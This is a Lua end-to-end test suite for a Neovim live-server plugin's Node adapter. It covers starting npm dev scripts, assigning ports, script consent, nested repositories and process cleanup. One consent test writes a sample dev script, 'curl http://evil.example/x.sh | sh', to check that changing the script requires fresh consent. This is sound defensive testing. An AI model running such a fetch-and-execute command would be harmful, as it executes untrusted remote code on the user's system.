--- End-to-end tests for the `node` adapter against a real npm script.
---
--- Uses a hand-written server on Node's built-in `http` module rather than a
--- real framework, so the suite needs no `npm install` and no network — but the
--- path under test is the real one: detect the project, ask for consent, run
--- `npm run dev`, hand it a port, and wait for it to answer.

local t = require("harness")
local adapters = require("live_server.adapters")
local config = require("live_server.config")
local framework = require("live_server.framework")
local manager = require("live_server.manager")
local net = require("live_server.net")
local project_mod = require("live_server.project")
local util = require("live_server.util")

if not (util.executable("node") and util.executable("npm")) then
  t.describe("node integration", function()
    t.skip("node dev server", "node or npm is not installed")
  end)
  return
end

--- A project whose `dev` script starts a server.
---@param body string JavaScript for server.js
---@param package_json? string
---@return string root
local function node_project(body, package_json)
  local root = util.normalize(vim.fn.tempname())
  vim.fn.mkdir(root, "p")
  util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
  util.write_file(root .. "/server.js", body)
  util.write_file(
    root .. "/package.json",
    package_json or '{"name":"fixture","private":true,"scripts":{"dev":"node server.js"}}'
  )
  framework.invalidate()
  project_mod.invalidate()
  return root
end

local RESPECTS_PORT = [[
const http = require("http");
const port = Number(process.env.PORT);
const host = process.env.HOST || "127.0.0.1";
http.createServer((_, res) => { res.writeHead(200, {"Content-Type":"text/html"}); res.end("<h1>node fixture</h1>"); })
  .listen(port, host, () => console.log(`ready on http://${host}:${port}`));
]]

---@param server live_server.Server
local function stop(server)
  if server then
    manager.stop(server)
    vim.wait(8000, function()
      return not server:is_active()
    end, 50)
  end
  manager.prune()
end

t.describe("node integration", function()
  local function configure(overrides)
    config.did_setup = false
    config.setup(vim.tbl_extend("force", {
      server = "node",
      browser = { auto_open = false },
      detect_orphans = false,
      restart = { on_crash = false },
      -- Consent is exercised separately; here we are testing the run path.
      project = { trust = "allow" },
      port = { strategy = "scan", range = { 5820, 5860 }, remember = false },
      ready = { timeout = 30000 },
    }, overrides or {}))
  end

  t.it("runs the project's dev script and serves it", function()
    configure()
    local root = node_project(RESPECTS_PORT)

    local started, failure = nil, nil
    manager.start({ dir = root }, function(server, err)
      started, failure = server, err
    end)
    t.truthy(
      vim.wait(40000, function()
        return started ~= nil or failure ~= nil
      end, 100),
      "start never completed"
    )
    t.truthy(started, "node dev server failed to start: " .. tostring(failure))
    t.eq(started.status, "running")
    t.eq(started.adapter.name, "node")

    if util.executable("curl") then
      local code, exit_code, stderr = t.http_status(started:url())
      t.eq(exit_code, 0, "curl failed: " .. stderr)
      t.eq(code, "200", "the dev server did not answer")
    end

    local port = started.port
    stop(started)
    t.truthy(
      vim.wait(8000, function()
        return net.is_free("127.0.0.1", port)
      end, 100),
      "the port was not released — an npm child process probably outlived its parent"
    )
  end)

  t.it("adopts the port the process actually bound", function()
    -- The classic Express mistake: `app.listen(4000)` hard-coded, ignoring
    -- PORT entirely. Reporting that server as unreachable would be technically
    -- true and completely useless.
    configure()
    local hardcoded = 5871
    if not net.is_free("127.0.0.1", hardcoded) then
      hardcoded = 5872
    end

    local root = node_project(([[
const http = require("http");
http.createServer((_, res) => { res.writeHead(200); res.end("ok"); })
  .listen(%d, "127.0.0.1", () => console.log("Listening on http://127.0.0.1:%d"));
]]):format(hardcoded, hardcoded))

    local started = nil
    manager.start({ dir = root, port = 5830 }, function(server)
      started = server
    end)
    t.truthy(
      vim.wait(40000, function()
        return started ~= nil
      end, 100),
      "the server never became ready on the port it reported"
    )
    t.eq(started.port, hardcoded, "expected the reported port to be adopted")
    t.contains(started:url(), tostring(hardcoded))
    stop(started)
  end)

  t.it("reports a project with no dev script instead of guessing", function()
    configure()
    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root, "p")
    util.write_file(root .. "/package.json", '{"name":"lib","version":"1.0.0"}')
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
    framework.invalidate()
    project_mod.invalidate()

    local failure = nil
    manager.start({ dir = root, adapter = "node" }, function(_, err)
      failure = err or "failed"
    end)
    t.truthy(
      vim.wait(5000, function()
        return failure ~= nil
      end, 50),
      "no error was reported"
    )
    t.contains(failure, "script")
  end)

  t.it("labels the server by framework, not by adapter", function()
    configure()
    local root = node_project(RESPECTS_PORT, '{"dependencies":{"next":"14"},"scripts":{"dev":"node server.js"}}')
    local project = project_mod.get(root)
    t.eq(adapters.display_for("node", project), "Next.js")
  end)

  t.it("does not offer the node adapter outside a Node project", function()
    configure()
    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root, "p")
    util.write_file(root .. "/index.html", "<h1>static</h1>")
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
    framework.invalidate()
    project_mod.invalidate()

    local project = project_mod.get(root)
    t.falsy(adapters.suits_project("node", project), "a folder of HTML is not an npm project")

    -- `auto` must therefore fall through to a static server.
    config.did_setup = false
    config.setup({ server = "auto", browser = { auto_open = false }, detect_orphans = false })
    local spec = adapters.resolve("auto", project)
    if spec then
      t.neq(spec.name, "node")
    end
  end)

  config.did_setup = false
  config.setup({})
end)

t.describe("node adapter consent", function()
  t.it("refuses to run a script without consent", function()
    config.did_setup = false
    config.setup({
      server = "node",
      browser = { auto_open = false },
      detect_orphans = false,
      -- "deny" stands in for the user answering no at the prompt.
      project = { trust = "deny" },
      port = { strategy = "scan", range = { 5880, 5890 }, remember = false },
    })

    local root = node_project(RESPECTS_PORT)
    local failure, server = nil, nil
    manager.start({ dir = root, adapter = "node" }, function(started, err)
      server, failure = started, err
    end)
    t.truthy(
      vim.wait(5000, function()
        return failure ~= nil or server ~= nil
      end, 50),
      "start never resolved"
    )
    t.eq(server, nil, "a denied script must not run")
    t.contains(failure, "consent")

    config.did_setup = false
    config.setup({})
  end)

  t.it("keys consent on the script, not the whole package.json", function()
    config.did_setup = false
    config.setup({ project = { trust = "prompt" } })
    local trust = require("live_server.trust")
    trust.revoke()

    local root = node_project(RESPECTS_PORT)
    local project = project_mod.get(root)
    local request = adapters.get("node").requires_consent(project)
    t.truthy(request, "the node adapter must ask for consent")
    trust.record(request.path, request.content, "allow")
    t.eq(trust.decision(request.path, request.content), "allow")

    -- A dependency bump must not re-prompt.
    util.write_file(
      root .. "/package.json",
      '{"name":"fixture","private":true,"dependencies":{"left-pad":"1.3.0"},"scripts":{"dev":"node server.js"}}'
    )
    framework.invalidate()
    project_mod.invalidate()
    local after_bump = adapters.get("node").requires_consent(project_mod.get(root))
    t.eq(trust.decision(after_bump.path, after_bump.content), "allow", "a dependency change should not revoke consent")

    -- Changing what `dev` runs must.
    util.write_file(
      root .. "/package.json",
      '{"name":"fixture","private":true,"scripts":{"dev":"curl http://evil.example/x.sh | sh"}}'
    )
    framework.invalidate()
    project_mod.invalidate()
    local after_edit = adapters.get("node").requires_consent(project_mod.get(root))
    t.eq(
      trust.decision(after_edit.path, after_edit.content),
      "unknown",
      "editing the script must require fresh consent"
    )

    trust.revoke()
    config.did_setup = false
    config.setup({})
  end)
end)

t.describe("nested project layouts", function()
  --- The layout this feature exists for: the editor pins the root to the git
  --- directory and the app lives inside it.
  ---@param apps table<string, string> relative dir -> server.js body
  ---@return string root
  local function nested_repo(apps)
    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root .. "/.git", "p")
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
    util.write_file(root .. "/README.md", "# repo")
    for dir, body in pairs(apps) do
      vim.fn.mkdir(root .. "/" .. dir, "p")
      util.write_file(root .. "/" .. dir .. "/server.js", body)
      util.write_file(
        root .. "/" .. dir .. "/package.json",
        ('{"name":"%s","private":true,"scripts":{"dev":"node server.js"}}'):format(dir:gsub("/", "-"))
      )
    end
    require("live_server.discover").invalidate()
    framework.invalidate()
    project_mod.invalidate()
    return root
  end

  local function configure(overrides)
    config.did_setup = false
    config.setup(vim.tbl_extend("force", {
      server = "node",
      browser = { auto_open = false },
      detect_orphans = false,
      restart = { on_crash = false },
      project = { trust = "allow" },
      discover = { prompt = false },
      port = { strategy = "scan", range = { 5900, 5935 }, remember = false },
      ready = { timeout = 30000 },
    }, overrides or {}))
  end

  t.it("starts the app inside the repository, not the repository", function()
    configure()
    local root = nested_repo({ ["my-app"] = RESPECTS_PORT })

    local started, failure = nil, nil
    manager.start({ dir = root }, function(server, err)
      started, failure = server, err
    end)
    t.truthy(
      vim.wait(40000, function()
        return started ~= nil or failure ~= nil
      end, 100),
      "start never completed"
    )
    t.truthy(started, "failed to start the nested app: " .. tostring(failure))

    t.eq(started.project.root, root, "the repository is still the project root")
    t.eq(started.project.workdir, root .. "/my-app", "but the server runs in the app directory")
    t.contains(started.project.name, "my-app")

    if util.executable("curl") then
      local code, exit_code, stderr = t.http_status(started:url())
      t.eq(exit_code, 0, "curl failed: " .. stderr)
      t.eq(code, "200")
    end
    stop(started)
  end)

  t.it("runs two apps from one repository at once", function()
    configure()
    local root = nested_repo({ frontend = RESPECTS_PORT, api = RESPECTS_PORT })

    local first = nil
    manager.start({ dir = root .. "/frontend" }, function(server)
      first = server
    end)
    t.truthy(vim.wait(40000, function()
      return first ~= nil
    end, 100))

    local second = nil
    manager.start({ dir = root .. "/api" }, function(server)
      second = server
    end)
    t.truthy(vim.wait(40000, function()
      return second ~= nil
    end, 100))

    t.truthy(second, "the second app should start, not be deduplicated against the first")
    t.falsy(rawequal(first, second))
    t.neq(first.port, second.port)
    t.eq(#manager.for_project(root, { active_only = true }), 2, "both belong to the same repository")

    stop(first)
    stop(second)
  end)

  t.it("deduplicates per app, not per repository", function()
    configure()
    local root = nested_repo({ frontend = RESPECTS_PORT })

    local first = nil
    manager.start({ dir = root .. "/frontend" }, function(server)
      first = server
    end)
    t.truthy(vim.wait(40000, function()
      return first ~= nil
    end, 100))

    local again = nil
    manager.start({ dir = root .. "/frontend" }, function(server)
      again = server
    end)
    t.truthy(vim.wait(5000, function()
      return again ~= nil
    end, 50))
    t.truthy(rawequal(first, again), "starting the same app twice must return the existing server")

    stop(first)
  end)

  config.did_setup = false
  config.setup({})
end)

t.describe("starting every service at once", function()
  local RESPECTS = [[
const http = require("http");
http.createServer((_, res) => { res.writeHead(200); res.end("ok"); })
  .listen(Number(process.env.PORT), "127.0.0.1", () => console.log("ready on http://127.0.0.1:" + process.env.PORT));
]]

  ---@return string root
  local function services_repo()
    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root .. "/.git", "p")
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
    for dir, deps in pairs({
      ["web"] = '"ws":"8"',
      ["server"] = '"express":"4"',
      ["server/socket"] = '"socket.io":"4"',
      ["ai_server"] = '"express":"4"',
    }) do
      vim.fn.mkdir(root .. "/" .. dir, "p")
      util.write_file(root .. "/" .. dir .. "/app.js", RESPECTS)
      util.write_file(
        root .. "/" .. dir .. "/package.json",
        ('{"name":"%s","private":true,"dependencies":{%s},"scripts":{"start":"node app.js"}}'):format(
          dir:gsub("/", "-"),
          deps
        )
      )
    end
    require("live_server.discover").invalidate()
    framework.invalidate()
    project_mod.invalidate()
    return root
  end

  t.it("starts all of them, each on its own port", function()
    config.did_setup = false
    config.setup({
      browser = { auto_open = false },
      detect_orphans = false,
      restart = { on_crash = false },
      project = { trust = "allow" },
      port = { strategy = "scan", range = { 6200, 6250 }, remember = false },
      ready = { timeout = 30000 },
    })

    local root = services_repo()
    local result = nil
    manager.start_all({ dir = root }, function(started, failures)
      result = { started = started, failures = failures }
    end)
    t.truthy(
      vim.wait(120000, function()
        return result ~= nil
      end, 200),
      "start_all never finished"
    )
    t.eq(#result.failures, 0, "failures: " .. vim.inspect(result.failures))
    t.eq(#result.started, 4)

    local ports, workdirs = {}, {}
    for _, server in ipairs(result.started) do
      t.falsy(ports[server.port], "two services were given the same port")
      t.falsy(workdirs[server.project.workdir], "two servers share a working directory")
      ports[server.port] = true
      workdirs[server.project.workdir] = true
      t.eq(server.status, "running")
      t.eq(server.project.root, root, "all four belong to one repository")
    end

    t.eq(#manager.for_project(root, { active_only = true }), 4)

    manager.stop_all()
    vim.wait(15000, function()
      return manager.count_active() == 0
    end, 100)
    manager.prune()
  end)

  t.it("knows a socket server has no page to open", function()
    config.did_setup = false
    config.setup({ project = { trust = "allow" } })
    local root = services_repo()
    local base = project_mod.get(root)
    local adapters_mod = require("live_server.adapters")

    local socket_project = project_mod.derive(base, root .. "/server/socket")
    t.falsy(adapters_mod.get("node").serves_pages(socket_project), "a socket endpoint is not a page")

    local http_project = project_mod.derive(base, root .. "/server")
    t.truthy(adapters_mod.get("node").serves_pages(http_project))

    config.did_setup = false
    config.setup({})
  end)

  config.did_setup = false
  config.setup({})
end)

t.describe("stopping a layered process", function()
  if util.is_windows then
    t.skip("escaped process cleanup", "the fixture needs a POSIX shell")
    return
  end
  if not util.executable("python3") then
    t.skip("escaped process cleanup", "python3 is needed to detach the fixture into its own session")
    return
  end

  t.it("releases the port when the server escapes the process group", function()
    -- The real shape: npm -> nodemon -> node, where only the deepest process
    -- holds the port. Here the launcher deliberately ignores SIGTERM, which is
    -- exactly the failure mode that used to leak a listening server.
    config.did_setup = false
    config.setup({
      server = "node",
      browser = { auto_open = false },
      detect_orphans = false,
      restart = { on_crash = false },
      project = { trust = "allow" },
      port = { strategy = "scan", range = { 6300, 6330 }, remember = false },
      ready = { timeout = 30000 },
    })

    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root .. "/.git", "p")
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
    util.write_file(
      root .. "/server.js",
      [[
const http = require("http");
http.createServer((_, res) => { res.writeHead(200); res.end("ok"); })
  .listen(Number(process.env.PORT), "127.0.0.1", () => console.log("ready on port " + process.env.PORT));
]]
    )
    -- Two things make this escape an ordinary stop: the launcher ignores
    -- SIGTERM, and the server puts itself in a new session, so it is no longer
    -- in the process group Neovim signals. Verified by hand: without the
    -- process-tree walk the port stays held indefinitely.
    util.write_file(
      root .. "/launch.sh",
      table.concat({
        "#!/bin/sh",
        "trap '' TERM",
        "python3 -c 'import os,sys; os.setsid(); os.execvp(sys.argv[1], sys.argv[1:])' node server.js &",
        "wait",
        "",
      }, "\n")
    )
    util.write_file(
      root .. "/package.json",
      '{"name":"layered","private":true,"dependencies":{"express":"4"},"scripts":{"start":"sh launch.sh"}}'
    )
    framework.invalidate()
    project_mod.invalidate()
    require("live_server.discover").invalidate()

    local started, failure = nil, nil
    manager.start({ dir = root }, function(server, err)
      started, failure = server, err
    end)
    t.truthy(
      vim.wait(40000, function()
        return started ~= nil or failure ~= nil
      end, 100),
      "start never completed"
    )
    t.truthy(started, "layered server failed to start: " .. tostring(failure))

    local port = started.port
    t.truthy(net.is_listening("127.0.0.1", port, 1000))

    manager.stop(started)
    t.truthy(
      vim.wait(15000, function()
        return not started:is_active()
      end, 100),
      "the server never reported as stopped"
    )
    t.truthy(
      vim.wait(15000, function()
        return net.is_free("127.0.0.1", port)
      end, 200),
      "the port is still held — a descendant outlived the launcher we signalled"
    )
    manager.prune()
    config.did_setup = false
    config.setup({})
  end)
end)

t.describe("a declared service list", function()
  t.it("starts each service on the port the repository asked for", function()
    config.did_setup = false
    config.setup({
      browser = { auto_open = false },
      detect_orphans = false,
      restart = { on_crash = false },
      project = { trust = "allow" },
      port = { strategy = "pin", remember = false },
      ready = { timeout = 30000 },
    })

    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root .. "/.git", "p")
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")

    local body = [[
const http = require("http");
http.createServer((_, res) => { res.writeHead(200); res.end("ok"); })
  .listen(Number(process.env.PORT), "127.0.0.1", () => console.log("ready"));
]]
    -- Ports chosen high and unlikely to clash, exactly as a team would commit.
    local wanted = { web = 6501, api = 6502 }
    for dir, port in pairs(wanted) do
      vim.fn.mkdir(root .. "/" .. dir, "p")
      util.write_file(root .. "/" .. dir .. "/app.js", body)
      util.write_file(
        root .. "/" .. dir .. "/package.json",
        ('{"name":"%s","private":true,"dependencies":{"express":"4"},"scripts":{"start":"node app.js"}}'):format(dir)
      )
      if not net.is_free("127.0.0.1", port) then
        t.skip("declared ports", "port " .. port .. " is already taken on this machine")
        return
      end
    end
    util.write_file(
      root .. "/.liveserverrc.json",
      ('{"apps":[{"dir":"web","port":%d},{"dir":"api","port":%d}]}'):format(wanted.web, wanted.api)
    )

    framework.invalidate()
    project_mod.invalidate()
    require("live_server.discover").invalidate()

    local result = nil
    manager.start_all({ dir = root }, function(started, failures)
      result = { started = started, failures = failures }
    end)
    t.truthy(
      vim.wait(90000, function()
        return result ~= nil
      end, 200),
      "start_all never finished"
    )
    t.eq(#result.failures, 0, "failures: " .. vim.inspect(result.failures))
    t.eq(#result.started, 2)

    local by_dir = {}
    for _, server in ipairs(result.started) do
      by_dir[util.relative(root, server.project.workdir)] = server.port
    end
    t.eq(by_dir.web, wanted.web, "the declared port must be used verbatim")
    t.eq(by_dir.api, wanted.api)

    manager.stop_project(root, { quiet = true })
    vim.wait(15000, function()
      return manager.count_active() == 0
    end, 100)
    manager.prune()
    config.did_setup = false
    config.setup({})
  end)

  t.it("stops only this repository", function()
    config.did_setup = false
    config.setup({
      browser = { auto_open = false },
      detect_orphans = false,
      project = { trust = "allow" },
      port = { strategy = "scan", range = { 6520, 6550 }, remember = false },
      ready = { timeout = 30000 },
    })

    local body = [[
const http = require("http");
http.createServer((_, res) => { res.writeHead(200); res.end("ok"); })
  .listen(Number(process.env.PORT), "127.0.0.1", () => console.log("ready"));
]]
    ---@return string
    local function one_app_repo()
      local root = util.normalize(vim.fn.tempname())
      vim.fn.mkdir(root .. "/.git", "p")
      util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
      vim.fn.mkdir(root .. "/app", "p")
      util.write_file(root .. "/app/app.js", body)
      util.write_file(
        root .. "/app/package.json",
        '{"name":"a","private":true,"dependencies":{"express":"4"},"scripts":{"start":"node app.js"}}'
      )
      return root
    end

    require("live_server.discover").invalidate()
    framework.invalidate()
    project_mod.invalidate()

    local first_root, second_root = one_app_repo(), one_app_repo()
    local first, second = nil, nil
    manager.start({ dir = first_root .. "/app" }, function(s)
      first = s
    end)
    t.truthy(vim.wait(40000, function()
      return first ~= nil
    end, 100))
    manager.start({ dir = second_root .. "/app" }, function(s)
      second = s
    end)
    t.truthy(vim.wait(40000, function()
      return second ~= nil
    end, 100))

    local stopped = manager.stop_project(first_root, { quiet = true })
    t.eq(stopped, 1)
    t.truthy(
      vim.wait(10000, function()
        return not first:is_active()
      end, 100),
      "the targeted repository did not stop"
    )
    t.truthy(second:is_active(), "the other repository must be left alone")

    manager.stop_all()
    vim.wait(15000, function()
      return manager.count_active() == 0
    end, 100)
    manager.prune()
    config.did_setup = false
    config.setup({})
  end)
end)
